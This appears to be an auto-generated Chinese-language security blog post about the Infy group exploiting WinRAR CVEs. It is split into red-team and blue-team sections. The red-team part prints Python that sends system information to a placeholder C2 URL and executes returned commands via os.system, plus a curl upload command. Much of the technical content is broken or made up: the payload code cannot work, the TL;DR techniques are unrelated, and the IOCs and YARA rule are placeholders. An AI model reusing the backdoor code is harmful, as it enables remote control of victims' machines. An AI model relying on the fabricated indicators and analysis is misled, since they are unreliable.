---
layout: post
title:  "Infy Hackers Resume Operations with New C2 Servers After Iran Internet Blackout Ends"
date:   2026-02-05 12:44:33 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Infy 威脅群體的新型攻擊技術
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: Heap Spraying, Deserialization, Telegram Bot API

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Infy 威脅群體利用 WinRAR 的 1-day 安全漏洞 (CVE-2025-8088 或 CVE-2025-6218) 導致 RCE。
* **攻擊流程圖解**:
  1. 攻擊者上傳包含 Tornado Payload 的 RAR 檔案到目標機器。
  2. 受害者下載並解壓縮 RAR 檔案，觸發 Tornado Payload。
  3. Tornado Payload 進行系統信息收集和 C2 連接。
* **受影響元件**: WinRAR 5.x 版本，Windows 7/10/11 作業系統。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要獲得目標機器的網路存取權限。
* **Payload 建構邏輯**:

    ```
    
    python
    import os
    import requests
    
    # Tornado Payload
    def tornado_payload():
        # 收集系統信息
        system_info = {
            'os': os.name,
            'version': os.sys.platform
        }
        
        # C2 連接
        c2_server = 'https://example.com/c2'
        response = requests.post(c2_server, json=system_info)
        
        # 執行 C2 指令
        if response.status_code == 200:
            command = response.json()['command']
            os.system(command)
    
    # RAR 檔案構造
    def create_rar_file():
        # 建立 RAR 檔案
        rar_file = 'tornado_payload.rar'
        
        # 添加 Tornado Payload
        with open(rar_file, 'wb') as f:
            f.write(tornado_payload())
    
    # 上傳 RAR 檔案
    def upload_rar_file():
        # 上傳 RAR 檔案到目標機器
        upload_url = 'https://example.com/upload'
        files = {'file': open('tornado_payload.rar', 'rb')}
        response = requests.post(upload_url, files=files)
        
        if response.status_code == 200:
            print('RAR 檔案上傳成功')
    
    ```
* **範例指令**:

    ```
    
    bash
    curl -X POST -F "file=@tornado_payload.rar" https://example.com/upload
    
    ```
* **繞過技術**: Infy 威脅群體使用 Telegram Bot API 進行 C2 連接和指令下發，繞過傳統的 C2 伺服器檢測。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | C:\Windows\Temp\tornado_payload.rar |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Tornado_Payload {
        meta:
            description = "Tornado Payload Detection"
            author = "Blue Team"
        strings:
            $tornado_payload = { 74 65 73 74 5f 66 69 77 6c 64 73 64 32 31 32 33 33 73 }
        condition:
            $tornado_payload at 0
    }
    
    ```
* **緩解措施**:
  1. 更新 WinRAR 至最新版本。
  2. 禁止下載和執行來自不信任源的 RAR 檔案。
  3. 啟用 Windows Defender 和其他安全軟件的實時保護。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Heap Spraying**: 一種攻擊技術，通過在堆中分配大量的記憶體空間，來增加攻擊者控制記憶體的機會。
* **Deserialization**: 將序列化的數據轉換回原始的物件或結構，可能導致安全漏洞。
* **Telegram Bot API**: 一種 API，允許開發者創建 Telegram 機器人，實現自動化任務和 C2 連接。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/02/infy-hackers-resume-operations-with-new.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


